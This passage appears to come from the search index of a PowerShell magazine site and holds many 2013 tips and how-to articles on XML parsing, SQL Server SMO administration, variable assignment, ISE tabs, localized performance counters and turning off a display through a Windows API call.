Expression={$_.'#text' }} Select-Xml -Xml $Node -XPath 'Property' | ForEach-Object {$i=0} { $rv = $_.Node | Select-Object -Property Name, $Value, Path, Type $isCollection = $rv.Name -eq 'Property' if ($isCollection) { $CollectionItem = \u0026quot;[$i]\u0026quot; $i++ $rv.Path = (($Prefix) -join '.') + $CollectionItem } else { $rv.Path = ($Prefix + $rv.Name) -join '.' } $rv if (Select-Xml -Xml $_.Node -XPath 'Property') { if ($isCollection) { $PrefixNew = $Prefix.Clone() $PrefixNew[-1] += $CollectionItem Get-Property -Node $_.Node -Prefix ($PrefixNew ) } else { Get-Property -Node $_.Node -Prefix ($Prefix + $_.Node.Name ) } } } } } Process { $x++ $InputObject | ConvertTo-Xml -Depth $Depth | ForEach-Object { $_.Objects } | ForEach-Object { Get-Property $_.Object -Prefix $Prefix$x } | Where-Object { $_.Name -like \u0026quot;$Name\u0026quot; } | Where-Object { $_.Value -like $Value } | Where-Object { $_.Type -like $Type } | Where-Object { $IsNumeric.IsPresent -eq $false -or $_.Value -as [Double] } } }  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/19/mastering-everyday-xml-tasks-in-powershell/","tags":["How To","XML"],"title":"Mastering everyday XML tasks in PowerShell"},{"categories":["News"],"contents":"Here’s another cool project created by PowerShell MVP Doug Finke. PSharp is a tool designed for PowerShell’s Integrated Scripting Environment (ISE) editor. Its fast navigation capabilities allows you to quickly identify the functions, variables and commands in the current file, with a simple key stroke.\nWhen you have a long script it is hard to know where exactly a variable or a function is located within the script. With PSharp, you can press Ctrl+Shift+T and get a window that displays where those calls are made and you can easily navigate through them with the up or down arrows.\nAnd that’s only a part of what it’s capable of. For more information go to the project page on GitHub.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/18/psharp-makes-powershell-ise-better/","tags":["News"],"title":"PSharp makes PowerShell ISE better"},{"categories":["Tips and Tricks"],"contents":"There are many ways to get the path of the system directory (e.g system32). Here’ one that I find very useful that involves the .NET Environment class:\nPS\u0026gt; [System.Environment]::SystemDirectory C:\\WINDOWS\\system32  I use it in my PowerShell profile and adds it to my session’s Env drive so I can conveniently query its value just as I query all environment variables:\n# add a new environment variable PS\u0026gt; $env:SystemDirectory = [Environment]::SystemDirectory # query it using the $env drive variable PS\u0026gt; $env:SystemDirectory C:\\WINDOWS\\system32 Which also makes it very easy to be embedded and expanded in a string:\nPS\u0026gt; \"The path of the system directory is: $env:SystemDirectory\" The path of the system directory is: C:\\WINDOWS\\system32   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/16/pstip-get-the-fully-qualified-path-of-the-system-directory/","tags":["Tips and Tricks"],"title":"#PSTip Get the fully qualified path of the system directory"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\n[adsisearcher] is a PowerShell type adapter for DirectorySearcher .NET class. We can use this type adapter to perform queries against Active Directory Domain Services.\nIn this tip, we shall see how we can validate if a given user exists in AD or not. This is how we do it.\n[bool]([adsisearcher]\"samaccountname=username\").FindOne()  This snippet returns True or False based on if the user exists or not.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/15/pstip-validate-if-a-user-exists-in-active-directory/","tags":["Tips and Tricks"],"title":"#PSTip Validate if a user exists in Active Directory"},{"categories":["SQL","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nBefore performing tasks like adding roles to a SQL login, it is desired to validate the existence of SQL login. This can be done using the Server SMO.\nAdd-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" $smo = New-Object Microsoft.SqlServer.Management.Smo.Server $env:ComputerName if (($smo.logins).Name -contains 'MyServerLogin') { \"SQL login exists\" } else { \"SQL login does not exist\" }  We can wrap this into a reusable function.\nFunction Test-SQLLogin { param ( [string]$SqlLogin ) Add-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" $smo = New-Object Microsoft.SqlServer.Management.Smo.Server $env:ComputerName if (($smo.logins).Name -contains $SqlLogin) { $true } else { $false } }  Test-SQLLogin -SqlLogin 'domain\\sqluser' Test-SQLLogin -SqlLogin 'sqlsauser'   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/14/pstip-validate-if-a-sql-login-exists-using-powershell/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Validate if a SQL login exists using PowerShell"},{"categories":["SQL","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nWe can use SQL Server SMO object to add a SQL login to the database roles. For example, roles such as dbcreator, sysadmin, etc.\nLet us see how we can do it using PowerShell and SMO.\nAdd-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" $smo = New-Object Microsoft.SqlServer.Management.Smo.Server $env:ComputerName $smo.Logins[\"Domain\\SQLUser\"].AddToRoles('sysadmin')   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/13/pstip-add-a-sql-login-to-database-roles-using-smo/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Add a SQL login to database roles using SMO"},{"categories":["News"],"contents":"Ever wondered why isn’t there support for writing PowerShell scripts in Visual Studio? I have had several projects where I needed to integrate PowerShell scripts into a C# solution I created in Visual Studio. For this, I needed to use multiple editors – one for C# and another for PowerShell scripts. I am sure that I am not the only one looking for such integration between Visual Studio and PowerShell.\nAdam Driscoll, a fellow PowerShell MVP, announced that he is working on PoshTools – a reincarnation of PowerGUIVSX. PoshTools is a Visual Studio extension to enable writing PowerShell scripts and supports full IntelliSense capabilities for PowerShell inside the Visual Studio Editor. This new integration has no dependency on PowerGUI editor.\nThis project is hosted on GitHub. Some of the features included in the initial release are:\n Syntax Highlighting IntelliSense Debugging Breakpoints (some known issues) Breakpoint window Locals window Call Stack window Output Window Support PowerShell Project Support New item templates for PS1, PSD1, and PSM1 files  Go head and explore! We will write a detailed review soon!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/13/announcing-poshtools-visual-studio-extension-for-powershell-scripting/","tags":["News"],"title":"Announcing PoshTools – Visual Studio extension for PowerShell Scripting"},{"categories":["Columns","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 4.0 or above.\nStarting in Windows PowerShell 4.0 with the new Desired State Configuration (DSC) feature, we now have one more command type added to the list of command types: Configuration.\nTo get a list of Configuration commands only from your PowerShell session, type:\nPS\u0026gt; Get-Command -CommandType Configuration  To tell if a command in hand is a Configuration command, check the command ScriptBlock.IsConfiguration property\nPS\u0026gt; $command.ScriptBlock.IsConfiguration   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/12/pstip-identifying-dsc-commands/","tags":["PowerShell DSC"],"title":"#PSTip Identifying DSC commands"},{"categories":["Tips and Tricks"],"contents":"Here’s another cool variables tip. Say you want to initialize a few variables to a specific value. Instead of doing:\n$a = 1 $b = 1 $c = 1 $d = 1 Try PowerShell’s assignment expressions!\nPS\u0026gt; $a=$b=$c=$d = 1 PS\u0026gt; $a,$b,$c,$d 1 1 1 1 ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/09/pstip-initializing-multiple-variables-at-once/","tags":["Tips and Tricks"],"title":"#PSTip Initializing multiple variables at once"},{"categories":["Tips and Tricks"],"contents":"In the previous tip I showed how we can use multiple assignments to swap the value of two or more variable values. In today’s tip we’ll see another cool use of multiple assignments. Consider the following variable assignment.\n$a = 1 $b = 2 $c = 3 $d = 4 And with multiple assignments\nPS\u0026gt; $a,$b,$c,$d = 1,2,3,4 PS\u0026gt; $a,$b,$c,$d 1 2 3 4 Big difference! Less lines of code and much more elegant. Each value of the collection on the right hand side is assigned to its corresponding variable on the left side.\nWe can also assign the value of an array/collection to a series of variables. Here’s an example that using the Range operator:\nPS\u0026gt; $d,$e,$f,$g = 4..7 PS\u0026gt; $d,$e,$f,$g 4 5 6 7 # or with PS\u0026gt; $one,$two,$three,$four = '1 2 3 4'.Split() PS\u0026gt; $one,$two,$three,$four 1 2 3 4 One important thing to keep in mind is that if the collection of values is bigger than the number of variables, all remaining values will accumulate in the last variable. In the following example, variables $a, $b, and $c will contain their corresponding values (e.g 1, 2 and 3), but $d will contain multiple values: 4, 5, and 6.\nPS\u0026gt; $a,$b,$c,$d = 1,2,3,4,5,6 PS\u0026gt; $d 4 5 6 ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/08/pstip-multiple-variable-assignments/","tags":["Tips and Tricks"],"title":"#PSTip Multiple variable assignments"},{"categories":["Tips and Tricks"],"contents":"In most programming languages the conventional way to swap the value of two variable is to use a third variable.\nPS\u0026gt; $a=1 PS\u0026gt; $b=2 PS\u0026gt; $temp = $a PS\u0026gt; $a = $b PS\u0026gt; $b = $temp PS\u0026gt; \u0026quot;`$a=$a,`$b=$b\u0026quot; $a=2,$b=1 In Windows PowerShell it is much easier. We can use multiple assignments to perform the same operation in less code and without a third variable.\nPS\u0026gt; $a=1 PS\u0026gt; $b=2 PS\u0026gt; $a,$b = $b,$a PS\u0026gt; \u0026quot;`$a=$a,`$b=$b\u0026quot; $a=2,$b=1 You can also swap multiple variables. In the following example, $a will swap its value with $c, $b will swap its value with $d, and so on and so forth.\nPS\u0026gt; $a=1 PS\u0026gt; $b=2 PS\u0026gt; $c=3 PS\u0026gt; $d=4 PS\u0026gt; $a,$b,$d,$c = $c,$d,$a,$b PS\u0026gt; \u0026quot;`$a=$a,`$b=$b,`$c=$c,`$d=$d\u0026quot; $a=3,$b=4,$c=2,$d=1 ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/07/pstip-swapping-the-value-of-two-variables/","tags":["Tips and Tricks"],"title":"#PSTip Swapping the value of two variables"},{"categories":["SQL","Tips and Tricks"],"contents":"I was looking at way to retrieve the SQL instance names on a remote computer without using SQL SMO. This is essential for me as I don’t always expect to have the SQL SMO DLLs on the computer where I run my scripts.\nWe can certainly use the Windows Registry to find this information. If the remote system has a SQL service running, the SQL instance information is stored under HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\Instance Names\\SQL key. We can use the remote Registry service to query for this information from remote systems. So, having remote Registry service enabled on the target systems is essential for the following script to work.\nFunction Get-SQLInstance { param ( [string]$ComputerName = $env:COMPUTERNAME, [string]$InstanceName ) try { $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $ComputerName) $regKey= $reg.OpenSubKey(\u0026quot;SOFTWARE\\\\Microsoft\\\\Microsoft SQL Server\\\\Instance Names\\\\SQL\u0026quot; ) $instances = $regkey.GetValueNames() if ($InstanceName) { if ($instances -contains $InstanceName) { return $true } else { return $false } } else { $instances } } catch { Write-Error $_.Exception.Message return $false } }  You can use the above function as follows:\nPS\u0026gt; Get-SQLInstance MSSQLSERVER PS C:\\\u0026gt; Get-SQLInstance -ComputerName SQL1 MSSQLSERVER MIRRORInstance PS C:\\\u0026gt; Get-SQLInstance -ComputerName SQL1 -InstanceName SQLServer False ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/06/pstip-retrieve-all-sql-instance-names-on-local-and-remote-computers/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Retrieve all SQL instance names on local and remote computers"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nI have scripts that work with multiple versions of the same third-party .NET assemblies. Choosing between these is done when the script is run in production. When developing and testing these scripts, I can’t load a second one after the first loads because the namespaces overlap. If I open a new PowerShell tab, I get a new clean runspace. No variables are brought over, and none of my assemblies are loaded. This can also be helpful if you have setup code that works with the assembly DLL, because once you load the assembly, the file is locked.\nIf you wanted to have something move from the old environment to the new environment, all you would need to do is pass the information in a script block to the new PowerShell tab.\n\u0026lt;# .Synopsis Moves open files to a new PowerShell tab .Example Reset-IseTab –Save { function Prompt {'\u0026amp;gt;'} } #\u0026gt; Function Reset-IseTab { Param( [switch]$SaveFiles, [ScriptBlock]$InvokeInNewTab ) $Current = $psISE.CurrentPowerShellTab $FileList = @() $Current.Files | ForEach-Object { if ($SaveFiles -and (-not $_.IsSaved)) { Write-Verbose \u0026quot;Saving $($_.FullPath)\u0026quot; try { $_.Save() $FileList += $_ } catch [System.Management.Automation.MethodInvocationException] { # Save will fail saying that you need to SaveAs because the # file doesn't have a path. Write-Verbose \u0026quot;Saving $($_.FullPath) Failed\u0026quot; } } elseif ($_.IsSaved) { $FileList += $_ } } $NewTab = $psISE.PowerShellTabs.Add() $FileList | ForEach-Object { $NewTab.Files.Add($_.FullPath) | Out-Null $Current.Files.Remove($_) } # If a code block was to be sent to the new tab, add it here. # Think module loading or dot-sourcing something to put your environment # correct for the specific debug session. if ($InvokeInNewTab) { Write-Verbose \u0026quot;Will call this after the Tab Loads:`n $InvokeInNewTab\u0026quot; # Wait for the new tab to be ready to run more commands. While (-not $NewTab.CanInvoke) { Start-Sleep -Seconds 1 } $NewTab.Invoke($InvokeInNewTab) } if ($Current.Files.Count -eq 0) { #Only remove the tab if all of the files closed. $psISE.PowerShellTabs.Remove($Current) } }  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/05/pstip-reset-your-ise-runspace/","tags":["Tips and Tricks"],"title":"#PSTip Reset your ISE runspace"},{"categories":["SQL","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn an earlier tip, we looked at how we can retrieve the active connection count for a SQL database. In today’s tip we will look at how we can drop all the active connections before we can perform a detach database operation.\nFor this purpose, we will use the KillAllProcesses() method of the Server SMO.\nAdd-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=11.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" $smo = New-Object Microsoft.SqlServer.Management.Smo.Server $env:COMPUTERNAME $smo.KillAllProcesses('MyDB')  This code snippet will help you drop all active database connections of a given SQL database.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/02/pstip-drop-all-active-connections-of-sql-database/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Drop all Active Connections of SQL Database"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nAs a part of SQL SMO automation, when we want to detach or delete databases, we might want to first drop all active database connections. But how do we even know whether there are any active connections to the database or not?\nWe can use the Server SMO and the GetActiveDBConnectionCount() method for retrieving the connection count.\nAdd-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=11.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" $smo = New-Object Microsoft.SqlServer.Management.Smo.Server $env:COMPUTERNAME $smo.GetActiveDBConnectionCount('MyDB')  This code snippet returns an integer number indicating the active DB connections.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/01/pstip-get-active-database-connections-of-a-sql-database/","tags":["Tips and Tricks"],"title":"#PSTip Get Active Database Connections of a SQL Database"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 4.0 or above.\nWhen writing functions and declaring parameters, PowerShell lets us use many parameter attributes to define the behaviour of the parameter. For example, we can decide if the parameter is mandatory, positional, accepts pipeline input and more.\nStarting in PowerShell 4.0 there’s a new ParameterAttribute member named DontShow (online docs are not updated yet with that attribute).\nPS\u0026gt; New-Object System.Management.Automation.ParameterAttribute Position : -2147483648 ParameterSetName : __AllParameterSets Mandatory : False ValueFromPipeline : False ValueFromPipelineByPropertyName : False ValueFromRemainingArguments : False HelpMessage : HelpMessageBaseName : HelpMessageResourceId : DontShow : False TypeId : System.Management.Automation.ParameterAttribute Let’s see how it works. We’ll create a new function with two parameters and try to hide the second one. Notice that we can use a shorthand syntax and not specify a $true value. That’s true for all Boolean parameter (and CmdletBinding) attributes.\nfunction Test-DontShow { [CmdletBinding()] param( [Parameter(Mandatory)] [string]$Name, [Parameter(DontShow)] $HiddenParameter ) $Name,$HiddenParameter }  Now let’s try and check which parameters are visible to tab completion:\nAs you can see, tab completion sees only the Name parameter, the HiddenParameter parameter is not visible and is not completable. That said, if you know it’s there you can still operate it:\nPS\u0026gt; Test-DontShow -Name ps -HiddenParameter SortOf ps SortOf  Lastly, parameters are still discoverable using Get-Command regardless of their DontShow value.\nPS\u0026gt; (Get-Command Test-DontShow).Parameters.Keys Name HiddenParameter (...) I haven’t found a good reason to hide parameters yet but at least you know you can 🙂\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/29/pstip-hiding-parameters-from-tab-completion/","tags":["Tips and Tricks"],"title":"#PSTip Hiding parameters from tab completion"},{"categories":["Tips and Tricks"],"contents":"Let us say that you have a list of words or a sentence that you’d like to manipulate and make sure that every word starts with a capital letter. There are many ways to do that, including string manipulation or regular expression-fu. There’s actually a way that takes into count your culture settings.\nThe ToTitleCase() method converts a specified string to titlecase. Here’s how the signature of the methods looks like–all it takes is a string:\nPS\u0026gt; (Get-Culture).TextInfo.ToTitleCase OverloadDefinitions ------------------- string ToTitleCase(string str) Let’s try to convert the ‘wAr aNd pEaCe’ string:\nPS\u0026gt; $words = 'wAr aNd pEaCe' PS\u0026gt; $TextInfo = (Get-Culture).TextInfo PS\u0026gt; $TextInfo.ToTitleCase($words) War And Peace  Note that words that are entirely in upper-case are not converted.\nPS\u0026gt; $words = 'WAR AND PEACE' PS\u0026gt; $TextInfo.ToTitleCase($words) WAR AND PEACE  To ensure we always get back words with the first character in upper-case and the rest of the characters in lower-case, we explicitly convert the string to lower-case.\nPS\u0026gt; $TextInfo.ToTitleCase($words.ToLower()) War And Peace  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/24/pstip-how-to-convert-words-to-title-case/","tags":["Tips and Tricks"],"title":"#PSTip How to convert words to Title Case"},{"categories":["News"],"contents":"Few days ago the new version (0.6.17) of the Windows Azure PowerShell has been released. The Windows Azure PowerShell provides IT Pros and developers with Windows PowerShell cmdlets for building, deploying, and managing Windows Azure services.\nIf you prefer a Web Platform Installer, you can get the new version from Windows Azure Downloads page. For those among you who like direct access to .msi file, there is a link on the Windows Azure SDK Tools GitHub page or on the newly created Releases page. This release is mostly focused on better PowerShell support for SQL Azure features.\nHere is the official change log for version 0.6.17:\n Upgraded Windows Azure SDK dependency from 1.8 to 2.0. SQL Azure database CRUD cmdlets don’t require SQL auth anymore if the user owns the belonging subscription. Get-AzureSqlDatabaseServerQuota cmdlet to get the quota information for a specified Windows Azure SQL Database Server. SQL Azure service objective support  Get-AzureSqlDatabaseServiceObjective cmdlet to a service objective for the specified Windows Azure SQL Database Server. Added -ServiceObjective parameter to Set-AzureSqlDatabase to set the service objective of the specified Windows Azure SQL database.   Fixed a Get-AzureWebsite local caching issue. Now Get-AzureWebsite will always return the up-to-date web site information.  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/23/new-version-of-the-windows-azure-powershell-2/","tags":["News"],"title":"New version of the Windows Azure PowerShell"},{"categories":["News"],"contents":"The PowerShell Deep Dives book is ready for your reading pleasure!\nThe book, written by Microsoft MVPs and PowerShell community experts, contains 28 chapters grouped in four parts: Administration, Scripting, Development, and Platforms. It is intended for anyone with an interest in PowerShell. It covers core PowerShell concepts and other technologies that rely on PowerShell such as: SQL Server, WSUS, Active Directory, and more.\nAll contributing authors and editors deserve to be mentioned: Chris Bellée, Bartek Bielawski, Robert C. Cain, Jim Christopher, Adam Driscoll, Josh Gavant, Oisín Grehan, Jason Helmick, Jeffery Hicks, Don Jones, Ashley McGlone, Jonathan Medd, Ben Miller, Aleksandar Nikolić, James O’Neill, Arnaud Petitjean, Vadims Podans, Karl Prosser, Boe Prox, Matthew Reynolds, Mike Robbins, Donabel Santos, Richard Siddaway, Will Steele, Trevor Sullivan, and Jeff Wouters.\nOne important thing to keep in mind is that all proceeds will be donated to charity; you can help **SAVE THE CHILDREN. **\nThe printed version of the book should release on July 26 and eBooks a few weeks later.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/21/powershell-deep-dives-book/","tags":["News"],"title":"PowerShell Deep Dives book"},{"categories":["News"],"contents":"After the Getting started with PowerShell 3.0 event on Microsoft Virtual Academy, Jeffrey Snover and Jason Helmick are back with another full day PowerShell training event. This time around, they will be talking about Advanced Tools and Scripting with PowerShell 3.0.\nJeffrey Snover, the inventor of PowerShell, together with Jason Helmick, Senior Technologist at Concentrated Technology, will be delivering a one-day, hands-on Jump Start designed to teach the busy IT Professionals about this powerful management tool.\nYou’ll learn how PowerShell works and how to make PowerShell work for you—and you’ll learn it from the experts! Register for free and learn how to to turn your real time management and automation scripts into useful reusable tools and cmdlets.\nMore details HERE.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/21/advanced-tools-scripting-with-powershell-3-0-2/","tags":["News"],"title":"Advanced Tools \u0026 Scripting with PowerShell 3.0"},{"categories":["How To"],"contents":"Whether you want to know the CPU load of a system or how busy your network is, querying performance counters provides reliable and fast answers. In fact, PowerShell’s Get-Counter cmdlet makes this task almost trivial. To find out the current CPU load in the past 3 seconds (average), for example, this is all you need:\n# Sample interval 3 seconds $load = (Get-Counter \u0026quot;\\Processor(_total)\\% Processor Time\u0026quot; -SampleInterval 3).CounterSamples.CookedValue \u0026quot;Average CPU load in the past 3 seconds was $load%\u0026quot; All you need to know is the name of the performance counter, and we’ll cover that in a second.\nChallenge: Non-US systems The sample script above will either work beautifully or fail miserably. It simply won’t run on non-US systems. That’s right: performance counter names are localized, so they are differently named, depending on the language your computer uses. Crab but reality.\nThis is a huge strain. A German script will not run in New York, and a French script fails anywhere outside France.\nReplacing performance counter names with ID numbers There is a clever workaround, though: you can turn language-specific performance counter names into language-neutral ID numbers, then convert these numbers on the target system back into names. This way, you always get the names in the correct language.\nHere’s a function called Get-PerformanceCounterLocalName. When you submit the correct ID number, it returns the localized performance counter name for your system. While the sample code above worked only on US systems, the next sample code will work on any system, regardless of locale:\nFunction Get-PerformanceCounterLocalName { param ( [UInt32] $ID, $ComputerName = $env:COMPUTERNAME ) $code = '[DllImport(\u0026quot;pdh.dll\u0026quot;, SetLastError=true, CharSet=CharSet.Unicode)] public static extern UInt32 PdhLookupPerfNameByIndex(string szMachineName, uint dwNameIndex, System.Text.StringBuilder szNameBuffer, ref uint pcchNameBufferSize);' $Buffer = New-Object System.Text.StringBuilder(1024) [UInt32]$BufferSize = $Buffer.Capacity $t = Add-Type -MemberDefinition $code -PassThru -Name PerfCounter -Namespace Utility $rv = $t::PdhLookupPerfNameByIndex($ComputerName, $id, $Buffer, [Ref]$BufferSize) if ($rv -eq 0) { $Buffer.ToString().Substring(0, $BufferSize-1) } else { Throw 'Get-PerformanceCounterLocalName : Unable to retrieve localized name. Check computer name and performance counter ID.' } } $processor = Get-PerformanceCounterLocalName 238 $percentProcessorTime = Get-PerformanceCounterLocalName 6 (Get-Counter \u0026quot;\\$processor(_total)\\$percentProcessorTime\u0026quot; -SampleInterval 1).CounterSamples.CookedValue As you can see, instead of hard-coding localized performance counter names, the code uses Get-PerformanceCounterLocalName with ID numbers 238 and 6 to get the localized names, then uses those to get the performance data.\nWhich raises the question: Where do these numbers come from? And what other performance counters of interest are there?\nFinding other performance counter names Let’s first see how you can find all the other performance counter names, and then, how you can turn them into ID numbers. To see all the performance counters available, you can use this line:\nGet-Counter -ListSet * | Select-Object -ExpandProperty Counter \\TBS counters\\CurrentResources \\TBS counters\\CurrentContexts \\WSMan Quota Statistics(*)\\Process ID \\WSMan Quota Statistics(*)\\Active Users \\WSMan Quota Statistics(*)\\Active Operations \\WSMan Quota Statistics(*)\\Active Shells (...)  But beware: it is a huge list (and it may look different on your side, again, depending on your language settings). A better way may be to filter the general category. This would list all performance counters related to “processor”:\nGet-Counter -ListSet *processor* | Select-Object -ExpandProperty Counter \\Processor Information(*)\\Processor State Flags \\Processor Information(*)\\% of Maximum Frequency \\Processor Information(*)\\Processor Frequency \\Processor Information(*)\\Parking Status \\Processor Information(*)\\% Priority Time \\Processor Information(*)\\C3 Transitions/sec \\Processor Information(*)\\C2 Transitions/sec \\Processor Information(*)\\C1 Transitions/sec \\Processor Information(*)\\% C3 Time \\Processor Information(*)\\% C2 Time \\Processor Information(*)\\% C1 Time \\Processor Information(*)\\% Idle Time \\Processor Information(*)\\DPC Rate \\Processor Information(*)\\DPCs Queued/sec \\Processor Information(*)\\% Interrupt Time \\Processor Information(*)\\% DPC Time \\Processor Information(*)\\Interrupts/sec \\Processor Information(*)\\% Privileged Time \\Processor Information(*)\\% User Time (...)  Let’s pick \\Processor Information(*)\\Processor Frequency counter: on a US system, you could easily query the processor frequency like this:\nPS\u0026gt; Get-Counter \u0026quot;\\Processor Information(*)\\Processor Frequency\u0026quot; -SampleInterval 1 Timestamp CounterSamples --------- -------------- 17.07.2013 22:35:00 \\\\tobiasair1\\processor information(_total)\\processor frequency : 0 \\\\tobiasair1\\processor information(0,_total)\\processor frequency : 0 \\\\tobiasair1\\processor information(0,3)\\processor frequency : 800 \\\\tobiasair1\\processor information(0,2)\\processor frequency : 800 \\\\tobiasair1\\processor information(0,1)\\processor frequency : 800 \\\\tobiasair1\\processor information(0,0)\\processor frequency : 800  So in your counter name, “(*)” stands for “all counter instances”, and as you can see, there are two total counts and four additional counts for my four-core-machine, representing each core. If I wanted to monitor a specific core, I could have written:\n# Sample interval 1 seconds $freq = (Get-Counter \u0026quot;\\Processor Information(0,0)\\Processor Frequency\u0026quot; -SampleInterval 1).CounterSamples.CookedValue \u0026quot;Average CPU frequency in CPU Core 0 in the past second was $freq MHz\u0026quot; Note how I replaced “(*)” with “(0,0)” in the counter name to monitor my first core CPU.\nTranslating performance counter names In order for the script code to run on any machine, not just US systems, we now need to translate the performance counter names to their corresponding ID numbers. Here’s how:\nfunction Get-PerformanceCounterID { param ( [Parameter(Mandatory=$true)] $Name ) if ($script:perfHash -eq $null) { Write-Progress -Activity 'Retrieving PerfIDs' -Status 'Working' $key = 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Perflib\\CurrentLanguage' $counters = (Get-ItemProperty -Path $key -Name Counter).Counter $script:perfHash = @{} $all = $counters.Count for($i = 0; $i -lt $all; $i+=2) { Write-Progress -Activity 'Retrieving PerfIDs' -Status 'Working' -PercentComplete ($i*100/$all) $script:perfHash.$($counters[$i+1]) = $counters[$i] } } $script:perfHash.$Name } Get-PerformanceCounterID -Name 'Processor Information' Get-PerformanceCounterID -Name 'Processor Frequency'  The function Get-PerformanceCounterID can translate the localized name part to a generic ID number. So the two localized strings correspond to ID numbers 1848 and 1884:\nPS\u0026gt; Get-PerformanceCounterLocalName 1848 Processor Information PS\u0026gt; Get-PerformanceCounterLocalName 1884 Processor Frequency Now, you can turn the script into a globalized version that runs on any locale:\n$ProcessorInformation = Get-PerformanceCounterLocalName 1848 $ProcessorFrequency = Get-PerformanceCounterLocalName 1884 $freq = (Get-Counter \u0026quot;\\$ProcessorInformation(0,0)\\$ProcessorFrequency\u0026quot; -SampleInterval 1).CounterSamples.CookedValue \u0026quot;Average CPU frequency in CPU Core 0 in the past second was $freq MHz\u0026quot; Summary By turning localized performance counter names into ID numbers, working with performance counters finally is possible across different cultures, producing truly language-independent scripts. The trick is to convert the performance counter name into a culture-neutral ID number, then to use this number on the target system to get the correct performance counter name.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/19/querying-performance-counters-from-powershell/","tags":["How To"],"title":"Querying performance counters from PowerShell"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nThis week on a PowerShell forum, I stumbled upon user request to turn off his PC’s display on demand. I did not find what was the reason, but I guess he was trying to watch a horror movie and the shining display was ruining the experience. Or, more likely, he wanted to maximize his laptop’s battery life. Either way, after a few web searches I was able to come up with this:\n# Turn display off by calling WindowsAPI. # SendMessage(HWND_BROADCAST,WM_SYSCOMMAND, SC_MONITORPOWER, POWER_OFF) # HWND_BROADCAST\t0xffff # WM_SYSCOMMAND\t0x0112 # SC_MONITORPOWER\t0xf170 # POWER_OFF\t0x0002 Add-Type -TypeDefinition ' using System; using System.Runtime.InteropServices; namespace Utilities { public static class Display { [DllImport(\u0026quot;user32.dll\u0026quot;, CharSet = CharSet.Auto)] private static extern IntPtr SendMessage( IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam ); public static void PowerOff () { SendMessage( (IntPtr)0xffff, // HWND_BROADCAST 0x0112, // WM_SYSCOMMAND (IntPtr)0xf170, // SC_MONITORPOWER (IntPtr)0x0002 // POWER_OFF ); } } } ' The code uses the Add-Type cmdlet to define a new static type Utilities.Display. The type defines public method PowerOff() which you call to power off the display. To try it out run the code above (there will be no output) to define the type and then use this call to power off your display:\n[Utilities.Display]::PowerOff()  If it worked for you wrap the method call to Switch-DisplayOff PowerShell function, to make it easier to call and discover.\nfunction Switch-DisplayOff { [Utilities.Display]::PowerOff() }  Now it is ready to use in your current PowerShell session. If you decide to place it in your $profile for later use make sure you include the whole type definition as well as the function definition.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/18/pstip-how-to-switch-off-display-with-powershell/","tags":["Tips and 